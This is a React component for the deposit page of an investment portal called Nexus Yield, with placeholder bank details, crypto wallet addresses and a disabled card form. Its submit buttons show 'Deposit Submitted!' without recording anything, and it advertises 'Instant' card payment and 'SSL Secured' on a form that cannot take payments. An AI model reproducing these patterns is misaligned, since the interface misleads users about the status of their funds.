import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Copy, CheckCircle, Upload, AlertCircle } from "lucide-react";
import {
  SectionCard,
  Badge,
  GoldButton,
  PageHeader,
} from "../../components/portal/PortalUI";
import { useDeposits, useUserInvestments } from "../../hooks/usePortalData";
import { useAuth } from "../../context/AuthContext";
import { supabase } from "../../lib/supabase";

const fmt = (n) =>
  "$" +
  Number(n ?? 0).toLocaleString("en-US", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });
const fmtDate = (d) =>
  d
    ? new Date(d).toLocaleDateString("en-US", {
        month: "short",
        day: "numeric",
        year: "numeric",
      })
    : "—";
const statusColor = {
  Completed: "green",
  Pending: "amber",
  Processing: "blue",
  Failed: "red",
  Cancelled: "grey",
};

const bankDetails = [
  { label: "Bank Name", value: "First National Bank" },
  { label: "Account Name", value: "Nexus Yield Group Ltd" },
  { label: "Account Number", value: "0123456789" },
  { label: "Routing/Sort Code", value: "021000021" },
  { label: "Reference", value: "NYG-004521" },
];

const cryptoOptions = [
  { coin: "USDT (TRC-20)", address: "TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE" },
  {
    coin: "USDT (ERC-20)",
    address: "0x742d35Cc6634C0532925a3b8D4C9E2C4e8b1f2a3",
  },
  {
    coin: "Bitcoin (BTC)",
    address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  },
  {
    coin: "Ethereum (ETH)",
    address: "0x742d35Cc6634C0532925a3b8D4C9E2C4e8b1f2a3",
  },
];

const recentDeposits = [
  {
    date: "Apr 19, 2026",
    amount: "$5,000.00",
    method: "Bank Transfer",
    ref: "NYG-DEP-0419",
    status: "Confirmed",
  },
  {
    date: "Apr 10, 2026",
    amount: "$3,000.00",
    method: "USDT (TRC-20)",
    ref: "NYG-DEP-0410",
    status: "Confirmed",
  },
  {
    date: "Apr 1, 2026",
    amount: "$10,000.00",
    method: "Bank Transfer",
    ref: "NYG-DEP-0401",
    status: "Confirmed",
  },
];

function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      }}
      style={{
        background: "none",
        border: "none",
        cursor: "pointer",
        color: copied ? "#4ade80" : "#C9A84C",
        display: "flex",
        alignItems: "center",
        gap: 4,
        fontSize: 12,
        fontFamily: "DM Sans, sans-serif",
        padding: "4px 8px",
        borderRadius: 6,
        transition: "all 0.2s",
      }}
    >
      {copied ? (
        <>
          <CheckCircle size={13} /> Copied
        </>
      ) : (
        <>
          <Copy size={13} /> Copy
        </>
      )}
    </button>
  );
}

export default function DepositPage() {
  const { session } = useAuth();
  const { deposits, loading: depLoading } = useDeposits();
  const { investments } = useUserInvestments();

  const totalDeposited = deposits
    .filter((d) => d.status === "Completed")
    .reduce((s, d) => s + Number(d.amount), 0);
  const totalReturns = investments.reduce(
    (s, i) => s + Number(i.returns_earned ?? 0),
    0,
  );
  const currentBalance = totalReturns;

  const [tab, setTab] = useState("bank");
  const [crypto, setCrypto] = useState(cryptoOptions[0]);
  const [amount, setAmount] = useState("");
  const [cardAmount, setCardAmount] = useState("");
  const [cardFailure, setCardFailure] = useState("");
  const [submitted, setSubmitted] = useState(false);

  async function recordUnavailableCardPayment() {
    const numericAmount = Number(cardAmount);
    if (!session?.user || !Number.isFinite(numericAmount) || numericAmount <= 0) {
      setCardFailure("Enter a valid amount to continue.");
      return;
    }
    const { data: deposit, error: depositError } = await supabase.from("deposit_requests").insert({
      user_id: session.user.id, amount: numericAmount, method: "Card", status: "Failed",
      review_note: "Card processor is not configured.",
    }).select().single();
    if (depositError) return setCardFailure("Failed to create the payment attempt. Please try again.");
    const { error } = await supabase.from("card_payment_attempts").insert({
      user_id: session.user.id, deposit_request_id: deposit.id, amount: numericAmount,
      provider: "unconfigured", status: "Failed", failure_code: "provider_unavailable",
      failure_message: "Failed to connect to payment provider. No card details were collected.",
    });
    setCardFailure(error ? "Failed to record the provider error. Please try again." : "Failed to connect to payment provider. No card details were collected or saved.");
  }

  const tabs = [
    { id: "bank", label: "Bank Transfer" },
    { id: "card", label: "Card Payment" },
    { id: "crypto", label: "Crypto" },
  ];

  if (submitted)
    return (
      <div
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          minHeight: "60vh",
        }}
      >
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          style={{ textAlign: "center", maxWidth: 440 }}
        >
          <div
            style={{
              width: 72,
              height: 72,
              borderRadius: "50%",
              background: "rgba(74,222,128,0.15)",
              border: "1px solid rgba(74,222,128,0.3)",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              margin: "0 auto 24px",
            }}
          >
            <CheckCircle size={36} color="#4ade80" />
          </div>
          <h2
            style={{
              fontFamily: "Cormorant Garamond, serif",
              fontSize: 32,
              fontWeight: 700,
              color: "#fff",
              marginBottom: 12,
            }}
          >
            Deposit Submitted!
          </h2>
          <p
            style={{
              fontSize: 14,
              color: "#D6DEE8",
              opacity: 0.7,
              lineHeight: 1.7,
              marginBottom: 28,
            }}
          >
            Our team will verify your deposit and credit your account within
            1–24 hours. You'll receive a notification once confirmed.
          </p>
          <div
            style={{
              display: "flex",
              gap: 12,
              justifyContent: "center",
              flexWrap: "wrap",
            }}
          >
            <a href="/portal/plans">
              <GoldButton>Explore Investment Plans</GoldButton>
            </a>
            <a href="/portal/dashboard">
              <GoldButton variant="outline">Return to Dashboard</GoldButton>
            </a>
          </div>
        </motion.div>
      </div>
    );

  return (
    <div>
      <PageHeader
        title="Fund Your Account"
        subtitle="Add funds to your Nexus Yield account to start or grow your investments."
      />

      {/* Info banner */}
      <div
        style={{
          display: "flex",
          gap: 10,
          padding: "14px 18px",
          background: "rgba(96,165,250,0.08)",
          border: "1px solid rgba(96,165,250,0.2)",
          borderRadius: 10,
          marginBottom: 28,
        }}
      >
        <AlertCircle
          size={16}
          color="#60a5fa"
          style={{ flexShrink: 0, marginTop: 1 }}
        />
        <span style={{ fontSize: 13, color: "#D6DEE8", opacity: 0.8 }}>
          Funds are typically confirmed within 1–24 hours depending on payment
          method.
        </span>
      </div>

      <div
        style={{
          display: "grid",
          gridTemplateColumns: "1fr 300px",
          gap: 24,
          alignItems: "start",
        }}
        className="portal-chart-grid"
      >
        <div>
          {/* Tabs */}
          <div
            style={{
              display: "flex",
              background: "rgba(255,255,255,0.03)",
              border: "1px solid rgba(201,168,76,0.12)",
              borderRadius: 12,
              padding: 5,
              marginBottom: 24,
            }}
          >
            {tabs.map((t) => (
              <button
                key={t.id}
                onClick={() => setTab(t.id)}
                style={{
                  flex: 1,
                  padding: "11px",
                  borderRadius: 8,
                  border: "none",
                  cursor: "pointer",
                  fontSize: 13,
                  fontWeight: 600,
                  transition: "all 0.2s",
                  fontFamily: "DM Sans, sans-serif",
                  background:
                    tab === t.id
                      ? "linear-gradient(135deg, #C9A84C, #E8B84B)"
                      : "transparent",
                  color: tab === t.id ? "#0A0E1A" : "#D6DEE8",
                }}
              >
                {t.label}
              </button>
            ))}
          </div>

          <AnimatePresence mode="wait">
            {/* Bank Transfer */}
            {tab === "bank" && (
              <motion.div
                key="bank"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
              >
                <SectionCard title="Bank Transfer Instructions">
                  <p
                    style={{
                      fontSize: 13,
                      color: "#D6DEE8",
                      opacity: 0.65,
                      marginBottom: 20,
                      lineHeight: 1.7,
                    }}
                  >
                    Transfer funds to the account below. Use your Account ID as
                    the payment reference. Upload proof of payment after
                    transferring.
                  </p>
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: 0,
                      background: "rgba(255,255,255,0.02)",
                      border: "1px solid rgba(201,168,76,0.12)",
                      borderRadius: 12,
                      overflow: "hidden",
                      marginBottom: 24,
                    }}
                  >
                    {bankDetails.map((d, i) => (
                      <div
                        key={i}
                        style={{
                          display: "flex",
                          justifyContent: "space-between",
                          alignItems: "center",
                          padding: "14px 18px",
                          borderBottom:
                            i < bankDetails.length - 1
                              ? "1px solid rgba(255,255,255,0.05)"
                              : "none",
                        }}
                      >
                        <span
                          style={{
                            fontSize: 12,
                            color: "#D6DEE8",
                            opacity: 0.55,
                          }}
                        >
                          {d.label}
                        </span>
                        <div
                          style={{
                            display: "flex",
                            alignItems: "center",
                            gap: 8,
                          }}
                        >
                          <span
                            style={{
                              fontSize: 13,
                              color: "#fff",
                              fontWeight: 600,
                            }}
                          >
                            {d.value}
                          </span>
                          <CopyButton text={d.value} />
                        </div>
                      </div>
                    ))}
                  </div>

                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: 16,
                    }}
                  >
                    <div>
                      <label
                        style={{
                          fontSize: 13,
                          fontWeight: 600,
                          color: "#D6DEE8",
                          opacity: 0.8,
                          display: "block",
                          marginBottom: 8,
                        }}
                      >
                        Amount Transferred ($)
                      </label>
                      <input
                        type="number"
                        value={amount}
                        onChange={(e) => setAmount(e.target.value)}
                        placeholder="0.00"
                        style={{
                          width: "100%",
                          boxSizing: "border-box",
                          background: "rgba(255,255,255,0.04)",
                          border: "1px solid rgba(201,168,76,0.2)",
                          borderRadius: 10,
                          padding: "13px 16px",
                          color: "#fff",
                          fontSize: 15,
                          outline: "none",
                          fontFamily: "DM Sans, sans-serif",
                        }}
                      />
                    </div>
                    <div>
                      <label
                        style={{
                          fontSize: 13,
                          fontWeight: 600,
                          color: "#D6DEE8",
                          opacity: 0.8,
                          display: "block",
                          marginBottom: 8,
                        }}
                      >
                        Proof of Payment
                      </label>
                      <div
                        style={{
                          border: "2px dashed rgba(201,168,76,0.25)",
                          borderRadius: 10,
                          padding: "28px",
                          textAlign: "center",
                          cursor: "pointer",
                          transition: "border-color 0.2s",
                        }}
                        onMouseEnter={(e) =>
                          (e.currentTarget.style.borderColor =
                            "rgba(201,168,76,0.5)")
                        }
                        onMouseLeave={(e) =>
                          (e.currentTarget.style.borderColor =
                            "rgba(201,168,76,0.25)")
                        }
                      >
                        <Upload
                          size={24}
                          color="#C9A84C"
                          style={{ marginBottom: 8 }}
                        />
                        <p
                          style={{
                            fontSize: 13,
                            color: "#D6DEE8",
                            opacity: 0.6,
                            margin: 0,
                          }}
                        >
                          Drag & drop or click to upload (JPG, PNG, PDF)
                        </p>
                      </div>
                    </div>
                    <GoldButton
                      onClick={() => setSubmitted(true)}
                      style={{ alignSelf: "flex-start" }}
                    >
                      Submit Deposit
                    </GoldButton>
                  </div>
                </SectionCard>
              </motion.div>
            )}

            {/* Card */}
            {tab === "card" && (
              <motion.div
                key="card"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
              >
                <SectionCard title="Pay with Debit / Credit Card">
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: 16,
                    }}
                  >
                    {[
                      { label: "Amount ($)", placeholder: "0.00", type: "number" },
                    ].map((f) => (
                      <div key={f.label}>
                        <label
                          style={{
                            fontSize: 13,
                            fontWeight: 600,
                            color: "#D6DEE8",
                            opacity: 0.8,
                            display: "block",
                            marginBottom: 8,
                          }}
                        >
                          {f.label}
                        </label>
                        <input
                          type={f.type}
                          placeholder={f.placeholder}
                          value={cardAmount}
                          onChange={(e) => setCardAmount(e.target.value)}
                          style={{
                            width: "100%",
                            boxSizing: "border-box",
                            background: "rgba(255,255,255,0.04)",
                            border: "1px solid rgba(201,168,76,0.2)",
                            borderRadius: 10,
                            padding: "13px 16px",
                            color: "#fff",
                            fontSize: 14,
                            outline: "none",
                            fontFamily: "DM Sans, sans-serif",
                          }}
                        />
                      </div>
                    ))}
                    <div
                      style={{
                        display: "grid",
                        gridTemplateColumns: "1fr 1fr",
                        gap: 16,
                      }}
                    >
                      {[
                        { label: "Expiry Date", placeholder: "MM / YY" },
                        { label: "CVV", placeholder: "•••" },
                      ].map((f) => (
                        <div key={f.label}>
                          <label
                            style={{
                              fontSize: 13,
                              fontWeight: 600,
                              color: "#D6DEE8",
                              opacity: 0.8,
                              display: "block",
                              marginBottom: 8,
                            }}
                          >
                            {f.label}
                          </label>
                          <input
                            type="text"
                            placeholder={f.placeholder}
                            disabled
                            aria-label={`${f.label} unavailable until a payment provider is connected`}
                            style={{
                              width: "100%",
                              boxSizing: "border-box",
                              background: "rgba(255,255,255,0.04)",
                              border: "1px solid rgba(201,168,76,0.2)",
                              borderRadius: 10,
                              padding: "13px 16px",
                              color: "#fff",
                              fontSize: 14,
                              outline: "none",
                              fontFamily: "DM Sans, sans-serif",
                            }}
                          />
                        </div>
                      ))}
                    </div>
                    <p style={{ color: "#D6DEE8", opacity: 0.7, fontSize: 13, margin: 0 }}>
                      Card details are unavailable until a PCI-compliant provider is connected. No card number, CVV, or expiry is collected or stored.
                    </p>
                    <div
                      style={{ display: "flex", gap: 8, alignItems: "center" }}
                    >
                      {["VISA", "MC", "VERVE"].map((c) => (
                        <span
                          key={c}
                          style={{
                            fontSize: 11,
                            fontWeight: 700,
                            padding: "4px 10px",
                            borderRadius: 4,
                            background: "rgba(255,255,255,0.06)",
                            color: "#D6DEE8",
                            letterSpacing: 1,
                          }}
                        >
                          {c}
                        </span>
                      ))}
                      <span
                        style={{
                          fontSize: 11,
                          color: "#4ade80",
                          marginLeft: 8,
                        }}
                      >
                        🔒 SSL Secured
                      </span>
                    </div>
                    <GoldButton
                      onClick={recordUnavailableCardPayment}
                      style={{ alignSelf: "flex-start" }}
                    >
                      Pay Now
                    </GoldButton>
                    {cardFailure && <div role="alert" style={{ color: "#f87171", fontSize: 13 }}>{cardFailure}</div>}
                  </div>
                </SectionCard>
              </motion.div>
            )}

            {/* Crypto */}
            {tab === "crypto" && (
              <motion.div
                key="crypto"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
              >
                <SectionCard title="Crypto Transfer">
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: 20,
                    }}
                  >
                    <div>
                      <label
                        style={{
                          fontSize: 13,
                          fontWeight: 600,
                          color: "#D6DEE8",
                          opacity: 0.8,
                          display: "block",
                          marginBottom: 8,
                        }}
                      >
                        Select Cryptocurrency
                      </label>
                      <select
                        value={crypto.coin}
                        onChange={(e) =>
                          setCrypto(
                            cryptoOptions.find(
                              (c) => c.coin === e.target.value,
                            ),
                          )
                        }
                        style={{
                          width: "100%",
                          background: "rgba(255,255,255,0.04)",
                          border: "1px solid rgba(201,168,76,0.2)",
                          borderRadius: 10,
                          padding: "13px 16px",
                          color: "#fff",
                          fontSize: 14,
                          outline: "none",
                          cursor: "pointer",
                        }}
                      >
                        {cryptoOptions.map((c) => (
                          <option
                            key={c.coin}
                            value={c.coin}
                            style={{ background: "#0F1422" }}
                          >
                            {c.coin}
                          </option>
                        ))}
                      </select>
                    </div>
                    <div
                      style={{
                        background: "rgba(255,255,255,0.02)",
                        border: "1px solid rgba(201,168,76,0.12)",
                        borderRadius: 12,
                        padding: "20px",
                      }}
                    >
                      <div
                        style={{
                          fontSize: 11,
                          color: "#D6DEE8",
                          opacity: 0.5,
                          marginBottom: 8,
                          letterSpacing: 1,
                        }}
                      >
                        WALLET ADDRESS
                      </div>
                      <div
                        style={{
                          display: "flex",
                          justifyContent: "space-between",
                          alignItems: "center",
                          gap: 12,
                        }}
                      >
                        <code
                          style={{
                            fontSize: 12,
                            color: "#C9A84C",
                            wordBreak: "break-all",
                            flex: 1,
                          }}
                        >
                          {crypto.address}
                        </code>
                        <CopyButton text={crypto.address} />
                      </div>
                    </div>
                    <div
                      style={{
                        display: "flex",
                        gap: 10,
                        padding: "12px 16px",
                        background: "rgba(251,191,36,0.08)",
                        border: "1px solid rgba(251,191,36,0.2)",
                        borderRadius: 10,
                      }}
                    >
                      <AlertCircle
                        size={15}
                        color="#fbbf24"
                        style={{ flexShrink: 0, marginTop: 1 }}
                      />
                      <span
                        style={{
                          fontSize: 12,
                          color: "#D6DEE8",
                          opacity: 0.75,
                        }}
                      >
                        Network fees apply. Only send the selected coin to this
                        address.
                      </span>
                    </div>
                    <div>
                      <label
                        style={{
                          fontSize: 13,
                          fontWeight: 600,
                          color: "#D6DEE8",
                          opacity: 0.8,
                          display: "block",
                          marginBottom: 8,
                        }}
                      >
                        Upload Transaction Hash / Screenshot
                      </label>
                      <div
                        style={{
                          border: "2px dashed rgba(201,168,76,0.25)",
                          borderRadius: 10,
                          padding: "24px",
                          textAlign: "center",
                          cursor: "pointer",
                        }}
                      >
                        <Upload
                          size={20}
                          color="#C9A84C"
                          style={{ marginBottom: 6 }}
                        />
                        <p
                          style={{
                            fontSize: 12,
                            color: "#D6DEE8",
                            opacity: 0.5,
                            margin: 0,
                          }}
                        >
                          Upload proof of transfer
                        </p>
                      </div>
                    </div>
                    <GoldButton
                      onClick={() => setSubmitted(true)}
                      style={{ alignSelf: "flex-start" }}
                    >
                      I've Sent the Funds
                    </GoldButton>
                  </div>
                </SectionCard>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Balance sidebar */}
        <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
          <div
            style={{
              background:
                "linear-gradient(135deg, rgba(201,168,76,0.12), rgba(232,184,75,0.04))",
              border: "1px solid rgba(201,168,76,0.3)",
              borderRadius: 16,
              padding: "28px 24px",
            }}
          >
            <div
              style={{
                fontSize: 11,
                fontWeight: 700,
                letterSpacing: 2,
                color: "#C9A84C",
                marginBottom: 8,
              }}
            >
              CURRENT BALANCE
            </div>
            <div
              style={{
                fontFamily: "Cormorant Garamond, serif",
                fontSize: 36,
                fontWeight: 700,
                color: "#fff",
                marginBottom: 8,
              }}
            >
              {fmt(currentBalance)}
            </div>
            <div
              style={{
                fontSize: 12,
                color: "#D6DEE8",
                opacity: 0.5,
                marginBottom: 16,
              }}
            >
              Total Deposited: {fmt(totalDeposited)}
            </div>
            <a
              href="/portal/plans"
              style={{
                fontSize: 13,
                color: "#C9A84C",
                textDecoration: "none",
                fontWeight: 600,
              }}
            >
              Start Investing →
            </a>
          </div>
          <SectionCard title="Processing Times">
            <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
              {[
                ["Bank Transfer", "1–24 hours"],
                ["Card Payment", "Instant"],
                ["Crypto", "1–6 hours"],
              ].map(([m, t]) => (
                <div
                  key={m}
                  style={{ display: "flex", justifyContent: "space-between" }}
                >
                  <span
                    style={{ fontSize: 12, color: "#D6DEE8", opacity: 0.6 }}
                  >
                    {m}
                  </span>
                  <span
                    style={{ fontSize: 12, color: "#4ade80", fontWeight: 600 }}
                  >
                    {t}
                  </span>
                </div>
              ))}
            </div>
          </SectionCard>
        </div>
      </div>

      {/* Recent deposits */}
      <SectionCard
        title="Recent Deposits"
        action="View Full History"
        actionHref="/portal/transactions"
        style={{ marginTop: 24 }}
      >
        <div style={{ overflowX: "auto" }}>
          <table
            style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}
          >
            <thead>
              <tr style={{ borderBottom: "1px solid rgba(201,168,76,0.1)" }}>
                {["Date", "Amount", "Method", "Reference", "Status"].map(
                  (c) => (
                    <th
                      key={c}
                      style={{
                        padding: "10px 14px",
                        textAlign: "left",
                        color: "#D6DEE8",
                        opacity: 0.5,
                        fontWeight: 600,
                        fontSize: 11,
                        letterSpacing: 1,
                        textTransform: "uppercase",
                      }}
                    >
                      {c}
                    </th>
                  ),
                )}
              </tr>
            </thead>
            <tbody>
              {depLoading ? (
                <tr>
                  <td
                    colSpan={5}
                    style={{
                      padding: "24px",
                      textAlign: "center",
                      color: "#D6DEE8",
                      opacity: 0.4,
                      fontSize: 13,
                    }}
                  >
                    Loading…
                  </td>
                </tr>
              ) : deposits.length === 0 ? (
                <tr>
                  <td
                    colSpan={5}
                    style={{
                      padding: "24px",
                      textAlign: "center",
                      color: "#D6DEE8",
                      opacity: 0.4,
                      fontSize: 13,
                    }}
                  >
                    No deposits yet.
                  </td>
                </tr>
              ) : (
                deposits.map((d) => (
                  <tr
                    key={d.id}
                    style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}
                  >
                    <td style={{ padding: "13px 14px", color: "#D6DEE8" }}>
                      {fmtDate(d.created_at)}
                    </td>
                    <td
                      style={{
                        padding: "13px 14px",
                        color: "#4ade80",
                        fontWeight: 600,
                      }}
                    >
                      {fmt(d.amount)}
                    </td>
                    <td
                      style={{
                        padding: "13px 14px",
                        color: "#D6DEE8",
                        opacity: 0.8,
                      }}
                    >
                      {d.payment_method ?? "—"}
                    </td>
                    <td
                      style={{
                        padding: "13px 14px",
                        color: "#C9A84C",
                        fontFamily: "monospace",
                        fontSize: 12,
                      }}
                    >
                      {d.reference}
                    </td>
                    <td style={{ padding: "13px 14px" }}>
                      <Badge
                        label={d.status}
                        color={statusColor[d.status] ?? "grey"}
                      />
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </SectionCard>

      <style>{`@media (max-width: 1100px) { .portal-chart-grid { grid-template-columns: 1fr !important; } }`}</style>
    </div>
  );
}
